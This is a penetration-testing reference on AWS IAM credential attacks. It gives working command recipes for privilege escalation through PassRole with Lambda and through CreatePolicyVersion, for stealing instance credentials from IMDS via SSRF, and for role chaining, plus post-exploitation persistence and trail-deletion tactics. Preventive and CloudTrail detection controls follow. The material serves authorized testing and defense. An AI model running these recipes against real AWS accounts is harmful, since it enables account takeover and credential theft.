# IAM and Credential Attacks

> [!CAUTION]
> This file is for authorized security testing of AWS accounts you own or have explicit written permission to assess. Do not use these techniques against accounts, resources, or services you do not own or have permission to test.

## 1. Overview

AWS Identity and Access Management (IAM) is the authorization layer for every AWS API call. Every request is signed with a credential (an access key pair, a temporary session token, or a federated token), and every credential is bound to a principal (user, role, or federated identity) with one or more policies attached. The security of the entire account reduces to two questions: which credentials exist, and what can each of them do?

Credential attacks in AWS are different from credential attacks on a Linux host. There is no `/etc/shadow`, no NTLM hash, no Kerberos ticket to crack offline in the traditional sense. Instead:

- Long-lived **access keys** (`AKIA...`) are the closest analogue to a password: they are static, they do not expire unless explicitly rotated, and they are frequently leaked in source code, CI logs, and public repositories.
- **Temporary credentials** (`ASIA...` with a session token) are issued by STS when an identity assumes a role. They expire (15 minutes to 12 hours) but they are more powerful per unit of time because role trust policies often grant broad access.
- **Federated tokens** (SAML, OIDC) are exchanged for temporary credentials through `sts:AssumeRoleWithSAML` or `sts:AssumeRoleWithWebIdentity`.

This file covers how credentials are obtained, how IAM policies are evaluated, and how a low-privilege identity escalates to a higher one. The defensive side (section 6 and section 7) is not an afterthought: most IAM attacks are detectable with three or four specific CloudTrail events.

## 2. Reconnaissance / Enumeration

### 2.1 Identity discovery

Every enumeration starts with the current identity. `sts:GetCallerIdentity` is almost always allowed, even on heavily restricted identities:

```bash
aws sts get-caller-identity
aws sts get-session-token --duration-seconds 43200   # only for long-term user credentials
aws iam get-user --user-name <current-user>            # only for IAM users
```

The ARN reveals the identity type:

- `arn:aws:iam::<account>:user/<name>` - IAM user, long-lived credentials possible.
- `arn:aws:sts::<account>:assumed-role/<role>/<session>` - role session, temporary credentials, trust policy is the pivot point.
- `arn:aws:sts::<account>:federated-user/<name>` - federated identity.

### 2.2 Policy enumeration

For an IAM user, list the policies attached directly, through groups, and through inline policies:

```bash
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam list-groups-for-user --user-name <user>
# For each group:
aws iam list-attached-group-policies --group-name <group>
aws iam list-group-policies --group-name <group>
```

For a role session, the enumeration path is different:

```bash
aws iam list-attached-role-policies --role-name <role>
aws iam list-role-policies --role-name <role>
aws iam get-role --role-name <role>    # includes AssumeRolePolicyDocument (trust policy)
```

The policy documents themselves are the ground truth. `list-*` calls return metadata; `get-policy-version` returns the document:

```bash
aws iam get-policy-version --policy-arn <arn> --version-id <v>
aws iam get-user-policy --user-name <user> --policy-name <name>
aws iam get-role-policy --role-name <role> --policy-name <name>
```

### 2.3 Effective permissions

The list of attached policies is not the same as effective permissions. IAM evaluates the union of all allow statements minus the union of all deny statements, with explicit deny taking precedence. Two tools compute the effective set:

- **IAM Policy Simulator** (`aws iam simulate-principal-policy`) - native, no extra tooling, but it simulates one action at a time.
- **PMapper** and **Cloudsplaining** - third-party tools that parse the account and flag known privilege escalation paths.

```bash
# Native simulation for a single action
aws iam simulate-principal-policy \
    --policy-source-arn arn:aws:iam::123456789012:user/example \
    --action-names iam:PassRole ec2:RunInstances

# Cloudsplaining: download and analyze the account
cloudsplaining download
cloudsplaining scan --input-file default.json --output report
```

## 3. Common Attack Vectors

### 3.1 Leaked long-lived access keys

The single most common initial access in AWS is not a vulnerability in AWS itself: it is an access key pair committed to a public repository, logged in a CI/CD job, or pasted into a support ticket. Detection tools (GitHub secret scanning, TruffleHog, Gitleaks) are the first line of defense, but the attacker's job is trivial once a key is in hand: `aws sts get-caller-identity` confirms the key is live, and the rest of the attack surface opens up.

### 3.2 Privilege escalation through IAM misconfiguration

Several IAM permissions are de facto administrator equivalents when they can be combined. The most common chains:

- **`iam:PassRole` + a compute service** (`lambda:CreateFunction`, `ec2:RunInstances`, `ecs:RegisterTaskDefinition`, `glue:CreateDevEndpoint`, `cloudformation:CreateStack`). The attacker passes a more privileged role to a new resource, then invokes the resource.
- **`iam:CreatePolicyVersion` + `iam:SetDefaultPolicyVersion`.** The attacker creates a new version of a policy attached to the current identity with `Action: "*"`, then sets it as the default. This requires `iam:CreatePolicyVersion` on a policy attached to the identity, which is often overlooked.
- **`iam:AttachUserPolicy` / `iam:AttachRolePolicy` on self.** If the identity can attach any policy to itself, it can attach `AdministratorAccess` and become admin in one call.
- **`iam:PutUserPolicy` / `iam:PutRolePolicy` on self.** Same idea, inline policy instead of managed policy.
- **`iam:UpdateAssumeRolePolicy` + `sts:AssumeRole`.** The attacker rewrites the trust policy of a more privileged role to trust the current identity, then assumes it.
- **`iam:CreateAccessKey` on another user.** If the identity can create access keys for a more privileged user, it can mint a long-lived credential for that user.
- **`iam:CreateLoginProfile` / `iam:UpdateLoginProfile`.** The attacker creates or resets a console password for a user, then logs in with that user.

Each of these is a one-call or two-call escalation. None requires exploiting a memory bug or a service vulnerability: they are all misconfigurations of IAM permissions.

### 3.3 SSRF to the instance metadata service

An EC2 instance's role credentials are exposed at the instance metadata service (IMDS): `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`. If a public application on the instance has an SSRF, the attacker reaches IMDS through the application and receives the instance role's temporary credentials. IMDSv2 adds a `PUT /latest/api/token` step before the `GET`, but many SSRF gadgets can perform the two-step request.

### 3.4 Role chaining and confused deputy

A role trust policy that allows `Principal: "*"` or a broad `AWS: "*"` without an `ExternalId` condition can be assumed by any AWS identity that knows the role ARN. Combined with a role that grants access to sensitive resources, this is a confused-deputy attack: a third-party service is tricked into using its own credentials on an attacker-controlled resource.

### 3.5 Credential theft from CI/CD and build systems

CI/CD runners are high-value targets because they hold credentials to deploy to production. Common patterns:

- Environment variables holding `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` that are logged by mistake.
- GitHub Actions with `permissions: id-token: write` that assume a role via OIDC; if the workflow is compromised, the OIDC token can be exchanged for role credentials.
- Build artifacts that contain `.aws/credentials` files.
- GitLab CI variables marked as "protected" but exposed to feature branches.

## 4. Exploitation Recipes

### 4.1 `iam:PassRole` + `lambda:CreateFunction` -> execution as a privileged role

Precondition: the current identity has `iam:PassRole` on a privileged role (for example `arn:aws:iam::123456789012:role/AdminRole`) and `lambda:CreateFunction` + `lambda:InvokeFunction`.

```bash
# 1. Create a Lambda function that assumes the privileged role and runs a command
aws lambda create-function \
    --function-name privesc-probe \
    --runtime python3.12 \
    --role arn:aws:iam::123456789012:role/AdminRole \
    --handler index.handler \
    --zip-file fileb://probe.zip

# 2. Invoke it
aws lambda invoke --function-name privesc-probe --payload '{}' /tmp/out.json

# 3. Read the result (the function ran with AdminRole credentials)
cat /tmp/out.json
```

The `probe.zip` contains an `index.py` that calls `boto3.client("sts").get_caller_identity()` and returns the JSON. Expected output after invocation:

```json
{"UserId":"AROAEXAMPLE:privesc-probe","Account":"123456789012","Arn":"arn:aws:sts::123456789012:assumed-role/AdminRole/privesc-probe"}
```

The `Arn` confirms the function executed under `AdminRole`, not under the attacker's original identity.

### 4.2 `iam:CreatePolicyVersion` -> full admin on the current identity

Precondition: the current identity has `iam:CreatePolicyVersion` and `iam:SetDefaultPolicyVersion` on a policy that is attached to the identity.

```bash
# 1. Find a policy attached to the current identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d/ -f2)

# 2. Create a new version with Action: "*" (assume the policy ARN is arn:aws:iam::123456789012:policy/ExamplePolicy)
cat > admin.json <<'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
EOF
aws iam create-policy-version \
    --policy-arn arn:aws:iam::123456789012:policy/ExamplePolicy \
    --policy-document file://admin.json \
    --set-as-default

# 3. Confirm
aws sts get-caller-identity
aws iam list-users   # now succeeds even if it did not before
```

### 4.3 IMDS credential theft via SSRF

Precondition: a public web application on an EC2 instance with an IAM role and an SSRF vulnerability. The IMDSv2 path requires two requests; the IMDSv1 path requires one.

```bash
# IMDSv1 (single request, if enabled)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# IMDSv2 (two-step, if IMDSv1 is disabled)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

Expected output (IMDSv1 or IMDSv2 after the token step):

```json
{
  "Code": "Success",
  "LastUpdated": "2026-10-22T12:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAEXAMPLE",
  "SecretAccessKey": "<SECRET>",
  "Token": "<SESSION_TOKEN>",
  "Expiration": "2026-10-22T18:00:00Z"
}
```

The temporary credentials (`ASIA...`) can be used directly with the AWS CLI by exporting `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`.

### 4.4 Role chaining through a permissive trust policy

Precondition: the current identity can assume a role whose trust policy allows `Principal: "*"` or a broad `AWS: "*"`.

```bash
# Check the trust policy first
aws iam get-role --role-name TargetRole --query 'Role.AssumeRolePolicyDocument'

# Assume it
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/TargetRole --role-session-name pivot

# Export the temporary credentials from the output and use them
export AWS_ACCESS_KEY_ID=ASIAEXAMPLE
export AWS_SECRET_ACCESS_KEY=<SECRET>
export AWS_SESSION_TOKEN=<TOKEN>
aws sts get-caller-identity
```

## 5. Post-Exploitation

After obtaining a privileged identity, the attacker's priorities are persistence, data access, and defense evasion. In IAM terms:

- **Persistence:** create a new IAM user with an access key (`iam:CreateUser` + `iam:CreateAccessKey`), add a trust policy to a role that trusts an external account, or create a new policy version that grants admin to a known user. Each leaves a distinct CloudTrail event.
- **Data access:** `s3:GetObject` on sensitive buckets, `rds:CreateDBSnapshot` + `rds:ModifyDBSnapshotAttribute` to share the snapshot with an external account, `dynamodb:Scan`, `secretsmanager:GetSecretValue`, `ssm:GetParameter` with `--with-decryption`.
- **Defense evasion:** `cloudtrail:StopLogging`, `cloudtrail:DeleteTrail`, `guardduty:DeleteDetector`, `config:DeleteConfigurationRecorder`. These are the events that should trigger the loudest alerts; well-configured accounts deny them with an SCP.

## 6. Preventive Controls

- **Never use long-lived access keys for humans or CI/CD.** IAM Identity Center (SSO) for humans, OIDC federation for CI/CD. SCP-deny `iam:CreateAccessKey` except for a documented break-glass role.
- **Require MFA for privilege-granting actions.** A condition `aws:MultiFactorAuthPresent: true` on `iam:*`, `sts:AssumeRole`, and any policy-changing call.
- **Block `iam:PassRole` unless the role is scoped.** Use a condition `iam:PassedToService` to restrict which services can receive which role.
- **Deny `iam:CreatePolicyVersion` and `iam:AttachUserPolicy` on self** unless the identity is a dedicated administrator role.
- **Enforce IMDSv2** at the account level: `aws ec2 modify-instance-metadata-options` with `HttpTokens=required`, and SCP-deny `RunInstances` without it.
- **Guard the trail and detector.** SCP-deny `cloudtrail:StopLogging`, `cloudtrail:DeleteTrail`, `guardduty:DeleteDetector`, `config:StopConfigurationRecorder`.

## 7. Detection Controls

CloudTrail records every IAM API call. The events worth alerting on, in order of importance:

- **`CreateAccessKey`** - new long-lived credential. Alert on any call from outside the break-glass role.
- **`CreateUser` / `CreateLoginProfile` / `UpdateLoginProfile`** - new identity or console password.
- **`AttachUserPolicy` / `AttachRolePolicy` / `PutUserPolicy` / `PutRolePolicy`** - privilege change.
- **`CreatePolicyVersion` / `SetDefaultPolicyVersion`** - policy rewrite.
- **`UpdateAssumeRolePolicy`** - trust policy change. This is the pivot for cross-account attacks.
- **`AssumeRole` to a role the caller has never used** - especially from an unusual IP or user agent.
- **`GetSecretValue` / `GetParameter` with `--with-decryption`** - secret access, alert on unusual principals.
- **`StopLogging` / `DeleteTrail` / `DeleteDetector`** - defense evasion, should be impossible.
- **`GetCallerIdentity` from a new IP** - weak alone, but a leading indicator when combined with any of the above.

GuardDuty findings that overlap with this file: `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`, `Persistence:IAMUser/UserPermissions`, `PrivilegeEscalation:IAMUser/AdministrativePermissions`, `Discovery:IAMUser/AnomalousBehavior`.

## 8. Verification

Read-only checks to confirm the preventive controls in section 6 are in place:

```bash
# Access keys older than 90 days or never used
aws iam generate-credential-report
aws iam get-credential-report --query 'Content' --output text | base64 -d

# Roles with a wildcard in the trust policy
aws iam list-roles --query 'Roles[?contains(to_string(AssumeRolePolicyDocument), `"*"`)].RoleName'

# IMDSv2 enforcement on running instances
aws ec2 describe-instances --query 'Reservations[].Instances[].{ID:InstanceId,IMDS:MetadataOptions.HttpTokens}'

# CloudTrail status per region
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name <trail>
```

Expected result: no access keys older than 90 days, no roles with `Principal: "*"` in the trust policy, every instance `HttpTokens: required`, and `IsLogging: true` for every trail.

## 9. Certification Alignment

- **AWS Certified Solutions Architect - Associate** - IAM identity types, policy evaluation, role assumption, trust policies.
- **AWS Certified Security - Specialty** - credential management, IAM Access Analyzer, CloudTrail event analysis.
- **CompTIA Security+** - identity and access management, least privilege, multifactor authentication.

## 10. Production Notes

- `sts:GetCallerIdentity` is not blocked by most hardening guides. Do not rely on it as a control.
- Access key IDs are not secret but they are sensitive: an `AKIA...` ID in a log is a fingerprint, not a credential, but the pair (`AKIA...` + secret) is a full compromise.
- Temporary credentials expire (15 min to 12 h). An attacker who steals `ASIA...` credentials has a limited window; persistence requires creating a long-lived credential or a new trust relationship.
- The `iam:PassRole` chain is the most common privilege escalation in real AWS assessments. Check `iam:PassRole` first on any low-privilege identity.
- Cross-account role trust policies should require `sts:ExternalId` (confused-deputy protection) and, where possible, an `aws:PrincipalOrgID` condition.

## 11. References

- AWS IAM User Guide - https://docs.aws.amazon.com/IAM/latest/UserGuide/
- AWS IAM policy evaluation logic - https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_evaluation-logic.html
- AWS CloudTrail IAM events - https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference.html
- Amazon GuardDuty finding types - https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types.html
- Pacu (AWS exploitation framework) - https://github.com/RhinoSecurityLabs/pacu
- Cloudsplaining - https://github.com/salesforce/cloudsplaining
- PMapper - https://github.com/nccgroup/PMapper
